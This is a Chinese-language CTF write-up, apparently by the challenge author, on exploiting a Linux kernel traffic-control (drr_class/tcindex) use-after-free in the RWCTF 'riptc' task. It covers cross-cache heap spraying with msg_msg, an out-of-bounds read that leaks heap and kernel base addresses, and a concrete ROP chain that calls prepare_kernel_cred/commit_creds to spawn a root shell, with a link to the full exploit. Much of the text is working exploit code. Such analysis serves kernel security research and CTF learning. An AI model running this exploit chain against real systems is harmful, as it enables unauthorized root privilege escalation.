其实除了时间窗口，我还需要确保循环减1的drr_class对象，正好是prepare_copy生成的msg_msg对象，基础的cross cache做完之后（下一节详解），只是一般性的[堆喷](https://adamdoupe.com/publications/kheaps-exploit-reliability-usenix22.pdf)和FUSE的[多线程](https://libfuse.github.io/doxygen/structfuse__loop__config.html#aa91fc3ebb89633f27e94d8ab510bc37e)来卡点都会降低利用的成功率。 借鉴[CVE-2022-29582](https://ruia-ruia.github.io/2022/08/05/CVE-2022-29582-io-uring/#method)的想法，我找到了一个精准定位的方法。

虽然存在`CONFIG_SLAB_FREELIST_RANDOM`，因为unbind减1就相当于m_ts减1，在减1后通过MSG_COPY的返回值即可确定这个被绑定多次的drr_class对象：

```c
static void find_cross_cache(void)
{
    int i;
    int ret;
    struct msgbuf {
        long mtype;
        char mtext[0x40];
    } msg;

    send_del_filter(0x42);
    sleep(5);

    memset(&msg, 0, sizeof(msg));
    for (i = 0; i < 2 * SPRAY_PAGE_NUM * ONEPAGE_K128_NUM; i++) {
        ret = msgrcv(g_qid[i], &msg, 0x3f, 0, IPC_NOWAIT | MSG_COPY);
        if (ret > 0) {
            found_cross_qid = i;
            break;
        }
    }

    if (found_cross_qid < 0) {
        printf("[-] Cannot find the cross cache one :(\n");
        exit(-1);
    }

    printf("[+] Find the cross cache one is at %d msgq\n", found_cross_qid);
}
```

因为前期的defragmentation会导致kmem_cache_cpu中还存在一定数量的free object，先将已经识别出来的这个object通过msgrcv给释放掉（挂在per cpu partial），喷1个page 的msg_msg object，减1再次识别出这个重占位的msg_msg是32个中第`X`个分配的（从0开始），再次msgrcv该对象，最后分配`X+1`个msg_msg，下一次分配的时候即可重新占位到被绑定多次的drr_class对象：

![](https://image.baidu.com/search/down?url=https://wx2.sinaimg.cn/large/ee2fecafly1hme1hghveuj20g80bvta0.jpg)

```c
static void find_reuse_one(void)
{
    int i;
    int ret;
    struct msgbuf {
        long mtype;
        char mtext[0x40];
    } msg;

    memset(&msg, 0, sizeof(msg));
    ret = msgrcv(g_qid[found_cross_qid], &msg, 0x3f, 1, IPC_NOWAIT);
    if (ret < 0)
        errExit("[-] msgrcv to free the cross cache one");

    msg.mtype = 1;
    memset(msg.mtext, 'G', sizeof(msg.mtext));
    for (i = 0; i < REUSE_PAGE_NUM * ONEPAGE_K128_NUM; i++) {
        ret = msgsnd(g_reuse_qid[i], &msg, sizeof(msg.mtext), 0);
        if (ret < 0)
            errExit("[-] msgsnd to alloc msg_msg");
    }

    send_del_filter(0x43);

    memset(&msg, 0, sizeof(msg));
    for (i = 0; i < REUSE_PAGE_NUM * ONEPAGE_K128_NUM; i++) {
        ret = msgrcv(g_reuse_qid[i], &msg, 0x3f, 0, IPC_NOWAIT | MSG_COPY);
        if (ret > 0) {
            found_reuse_qid = i;
            break;
        }
    }

    if (found_reuse_qid < 0) {
        printf("[-] Cannot find the reuse one :(\n");
        exit(-1);
    }

    printf("[+] Find the reuse one is at %d msgq\n", found_reuse_qid);

    memset(&msg, 0, sizeof(msg));
    ret = msgrcv(g_reuse_qid[found_reuse_qid], &msg, 0x3f, 1, IPC_NOWAIT);
    if (ret < 0)
        errExit("[-] msgrcv to free the reuse one");

    msg.mtype = 2;
    memset(msg.mtext, 'H', sizeof(msg.mtext));
    for (i = 0; i < found_reuse_qid + 1; i++) {
        ret = msgsnd(g_reuse_qid[i], &msg, sizeof(msg.mtext), 0);
        if (ret < 0)
            errExit("[-] msgsnd to alloc msg_msg");
    }
}
```

## cross cache

要使得kmalloc-128的drr_class转化为kmalloc-cg-128的msg_msg，自然是要做一层[cross cache](https://grsecurity.net/how_autoslab_changes_the_memory_unsafety_game)的转换，具体思路代码可参考[cache-of-castaways writeup](https://www.willsroot.io/2022/08/reviving-exploits-against-cred-struct.html)使用alloc_pg_vec去做[堆风水](https://etenal.me/archives/1825)。先耗尽现有的kmalloc-128和kmalloc-cg-128 solt，然后堆风水分隔开order 0 page，分配drr_class，将其中一个class bind至溢出，释放所有的drr_class，最后使用msg_msg进行占位：

```c
    drain_kmalloc_cg_128();
    drain_kmalloc_128();
    prepare_page_fengshui();
    alloc_drr_classes();
    bind_to_overflow();
    free_drr_classes();
    alloc_msg_msgs();
```

这里面涉及一个问题，我要释放多少个drr_class对象，才能使相应的slab回到伙伴系统。参考[图解slub](http://www.wowotech.net/memory_management/426.html)，只需kmem_cache_node的nr_partial大于kmem_cache的min_partial即可。对于per cpu partial上的slab迁移，取决于kmem_cache的cpu_partial的成员大小，但对于cpu_partial大小的含义，在原文中和[官方文档](https://www.kernel.org/doc/Documentation/ABI/testing/sysfs-kernel-slab)中解释的不一样，究竟是free object的数量，还是其上挂的page数量。

我最开始是在5.15.94上测试poc代码，结合之前[CVE-2022-29582](https://ruia-ruia.github.io/2022/08/05/CVE-2022-29582-io-uring/#crossing-the-cache-boundary)的writeup，以及放狗搜索的[探讨](https://lore.kernel.org/linux-mm/CAG48ez2Qx5K1Cab-m8BdSibp6wLTip6ro4=-umR7BLsEgjEYzA@mail.gmail.com/T/#u)，之前对于cpu partial的解释确实是其上挂的page数量：

> This means that in practice, SLUB actually ends up keeping as many **pages** on the percpu partial lists as it intends to keep **free objects** there.

后来经过[commit](https://github.com/torvalds/linux/commit/b47291ef02b0bee85ffb7efd6c336060ad1fe1a4)的兼容修复，在6.1.72上cpu_partial则表示为free object的数量，slab迁移的边界条件则是动态计算：

```c
static void slub_set_cpu_partial(struct kmem_cache *s, unsigned int nr_objects)
{
	unsigned int nr_slabs;

	s->cpu_partial = nr_objects;

	/*
	 * We take the number of objects but actually limit the number of
	 * slabs on the per cpu partial list, in order to limit excessive
	 * growth of the list. For simplicity we assume that the slabs will
	 * be half-full.
	 */
	nr_slabs = DIV_ROUND_UP(nr_objects * 2, oo_objects(s->oo));
	s->cpu_partial_slabs = nr_slabs;
}
```

所以无论per cpu partial上挂的page数量最大值是[30](https://elixir.bootlin.com/linux/v5.15.94/source/mm/slub.c#L4025)还是[8](https://elixir.bootlin.com/linux/v6.1.72/source/mm/slub.c#L4154)，我设定的总量是`SPRAY_PAGE_NUM + DRAIN_PAGE_NUM = 56`，终究都会传递回至buddy系统：

```c
static void free_drr_classes(void)
{
    int i;

    for (i = 1; i <= SPRAY_PAGE_NUM * ONEPAGE_K128_NUM; i += ONEPAGE_K128_NUM) {
        send_del_class(U_QDISC_HANDLE | (i));
    }

    for (i = 1; i <= DRAIN_PAGE_NUM * ONEPAGE_K128_NUM; i += ONEPAGE_K128_NUM) {
        send_del_class(U_QDISC_HANDLE | (SPRAY_PAGE_NUM * ONEPAGE_K128_NUM + i));
    }

    for (i = 1; i <= SPRAY_PAGE_NUM * ONEPAGE_K128_NUM; i++) {
        if ((i % ONEPAGE_K128_NUM) == 1)
            continue;
        send_del_class(U_QDISC_HANDLE | (i));
    }

    printf("[+] Free drr_class to buddy done\n");
}
```

## info leak

现在通过改大m_ts去做msg_msg越界读，我们提前在生成msg_msg时，在其内容中放置有关qid信息，即可知道相邻msg_msg是属于哪个msg_queue了。在msgsnd中会将发送的msg_msg链入同一个`msq->q_messages`，这样新加入一个较大的带rop payload的msg_msg，越界读后即可泄漏出可控内容的堆地址：

```c
	if (!pipelined_send(msq, msg, &wake_q)) {
		/* no one is waiting for this message, enqueue it */
		list_add_tail(&msg->m_list, &msq->q_messages);
		msq->q_cbytes += msgsz;
		msq->q_qnum++;
		percpu_counter_add_local(&ns->percpu_msg_bytes, msgsz);
		percpu_counter_add_local(&ns->percpu_msg_hdrs, 1);
	}
```

至于泄漏内核基地址，先找一找在kmalloc-cg-128中有没有可利用的结构体，借鉴使用user_key_payload进行信息泄漏的[手法](https://veritas501.github.io/2022_08_11_%E5%9F%BA%E4%BA%8EUSMA%E7%9A%84%E5%86%85%E6%A0%B8%E9%80%9A%E7%94%A8EXP%E7%BC%96%E5%86%99%E6%80%9D%E8%B7%AF%E5%9C%A8%20CVE-2022-34918%20%E4%B8%8A%E7%9A%84%E5%AE%9E%E8%B7%B5/#0x00-%E7%AE%80%E5%8D%95%E5%9B%9E%E9%A1%BE%E4%B8%8A%E6%AC%A1%E7%9A%84%E6%89%8B%E6%B3%95)，CodeQL查询合适的结构体，虽然不多但可以使用[in_ifaddr](https://elixir.bootlin.com/linux/v6.1.72/source/include/linux/inetdevice.h#L145)结构体，通过[RTM_NEWADDR](https://elixir.bootlin.com/linux/v6.1.72/source/net/ipv4/devinet.c#L2789)删除网卡上的IP地址，[call_rcu](https://blog.csdn.net/zhoutaopower/article/details/86646688)写入inet_rcu_free_ifa的地址，再次使用越界读即可泄漏内核基地址。

![](https://image.baidu.com/search/down?url=https://wx3.sinaimg.cn/large/ee2fecafly1hme1hkkrnej215k0dqq6m.jpg)

```c
static struct in_ifaddr *inet_alloc_ifa(void)
{
	return kzalloc(sizeof(struct in_ifaddr), GFP_KERNEL_ACCOUNT);
}

static void inet_rcu_free_ifa(struct rcu_head *head)
{
	struct in_ifaddr *ifa = container_of(head, struct in_ifaddr, rcu_head);
	if (ifa->ifa_dev)
		in_dev_put(ifa->ifa_dev);
	kfree(ifa);
}

static void inet_free_ifa(struct in_ifaddr *ifa)
{
	call_rcu(&ifa->rcu_head, inet_rcu_free_ifa);
}
```

## rop chain

最后的最后，要再次UAF触发tcindex的enqueue，需要在外面套一层[dsmark](https://elixir.bootlin.com/linux/v6.1.72/source/net/sched/sch_dsmark.c#L237)始祖，通过[SO_PRIORITY](https://elixir.bootlin.com/linux/v6.1.72/source/net/core/sock.c#L1209)来指定优先级即可到最终的res。参考[corjail](https://syst3mfailure.io/corjail/)的rop，提权后`find_task_by_vpid`找到task_struct后切换新的fs_struct即可。但需要注意下解决在`__dev_queue_xmit`中的[rcu_read_lock_bh](https://elixir.bootlin.com/linux/v6.1.72/source/net/core/dev.c#L4216)，解除对应的BH和rcu_read_lock，抢占计数减1的BUG：

```c
    kernel_offset = leaked_inet_rcu_free_ifa - 0xffffffff81e3b5d0;
    memset(buf, 0, sizeof(buf));
    memset(&msg, 0, sizeof(msg));

    msg.mtype = 3;
    *(uint64_t *)(msg.mtext) = kernel_offset + 0xffffffff81c77562; // enqueue: push rsi ; jmp qword ptr [rsi + 0x66]
    *(uint64_t *)(msg.mtext + 32) = 0; // stab
    *(uint32_t *)(msg.mtext + 168) = 0; // q.len
    *(uint64_t *)(msg.mtext + 0x66) = kernel_offset + 0xffffffff8112af1e; // pop rsp ; pop r15 ; ret
    *(uint64_t *)(msg.mtext + 8) = kernel_offset + 0xffffffff8108bbd8; // add rsp, 0xb0 ; jmp 0xffffffff82404c80

    rop = (uint64_t *)(msg.mtext + 0xc0);
    // rcu_read_lock_bh()
    *rop++ = kernel_offset + 0xffffffff810b99e1; // pop rdi ; ret
    *rop++ = kernel_offset + 0xffffffff81d435bd;
    *rop++ = kernel_offset + 0xffffffff8103e8a8; // pop rsi ; ret
    *rop++ = 0x200;
    *rop++ = kernel_offset + 0xffffffff811941a0; // __local_bh_enable_ip(_THIS_IP_, SOFTIRQ_DISABLE_OFFSET)

    // rcu_read_unlock()
    *rop++ = kernel_offset + 0xffffffff8120e350; // __rcu_read_unlock

    // BUG: scheduling while atomic: poc/224/0x00000002
    *rop++ = kernel_offset + 0xffffffff810b99e1; // pop rdi ; ret
    *rop++ = 1;
    *rop++ = kernel_offset + 0xffffffff811c2d20; // preempt_count_sub

    *rop++ = kernel_offset + 0xffffffff810b99e1; // pop rdi ; ret
    *rop++ = 0;
    *rop++ = kernel_offset + 0xffffffff811bb740; // prepare_kernel_cred

    *rop++ = kernel_offset + 0xffffffff8108ef2b; // pop rcx ; ret
    *rop++ = 0;
    *rop++ = kernel_offset + 0xffffffff82068a2b; // mov rdi, rax ; rep movsq qword ptr [rdi], qword ptr [rsi] ; jmp 0xffffffff82404c80
    *rop++ = kernel_offset + 0xffffffff811bb490; // commit_creds

    *rop++ = kernel_offset + 0xffffffff810b99e1; // pop rdi ; ret
    *rop++ = kernel_offset + 0xffffffff837b1f20; // &init_fs
    *rop++ = kernel_offset + 0xffffffff8144b900; // copy_fs_struct
    *rop++ = kernel_offset + 0xffffffff811d9b0c; // push rax ; pop rbx ; jmp 0xffffffff82404c80

    *rop++ = kernel_offset + 0xffffffff810b99e1; // pop rdi ; ret
    *rop++ = getpid();
    *rop++ = kernel_offset + 0xffffffff811b1e60; // find_task_by_vpid

    *rop++ = kernel_offset + 0xffffffff8108ef2b; // pop rcx ; ret
    *rop++ = 0x828;
    *rop++ = kernel_offset + 0xffffffff810705fe; // add rax, rcx ; jmp 0xffffffff82404c80
    *rop++ = kernel_offset + 0xffffffff816ac7a4; // mov qword ptr [rax], rbx ; add rsp, 0x10 ; xor eax, eax ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; jmp 0xffffffff82404c80
    rop += 8;

    *rop++ = kernel_offset + 0xffffffff82201146; // swapgs_restore_regs_and_return_to_usermode first mov
    *rop++ = 0;
    *rop++ = 0;
    *rop++ = (uint64_t)&get_root_shell;
    *rop++ = usr_cs;
    *rop++ = usr_rflags;
    *rop++ = usr_rsp;
    *rop++ = usr_ss;
```

最终的exploit代码时间消耗不到半分钟，成功率接近100%，完整的利用代码可见：<https://github.com/Larryxi/rwctf-6th-riptc>

![](https://image.baidu.com/search/down?url=https://wx1.sinaimg.cn/large/ee2fecafly1hme1hqcdbqj20u01hbn71.jpg)
# 0x04 赛后总结

本次比赛中[@N1ghtu](https://github.com/N1ghtu)仅用了一天就解出了该题目，也是这次比赛中的唯一解，可见他日常的积累与强劲的输出，解法具体而言使用[EntryBleed](https://www.willsroot.io/2022/12/entrybleed.html)泄漏内核地址，结合弹性对象pg_vec的特性（其为动态生成的堆地址数组），正好解决了2次引用的问题，堆的内容也是用户完全[可控](https://vul.360.net/archives/391)，丝滑又轻松地完成了题目的利用。

对于弹性结构体和偏移24减1的原语，有想过使用[Dirty Pagetable](https://ptr-yudai.hatenablog.com/entry/2023/12/08/093606)的方法去利用，但还未来得及付诸实践，看来研究学习的征途依然漫长。巧妇难为无米之炊，个人认为漏洞挖掘和漏洞利用是相辅相成的，本质都是对于系统代码能力的hack，虽然角度不一样，从CTF比赛的角度而言需要给选手们更加丝滑的体验做一些平衡取舍，期待我们下一届[RWCTF](https://www.realworldctf.com/)比赛的相遇，感谢。
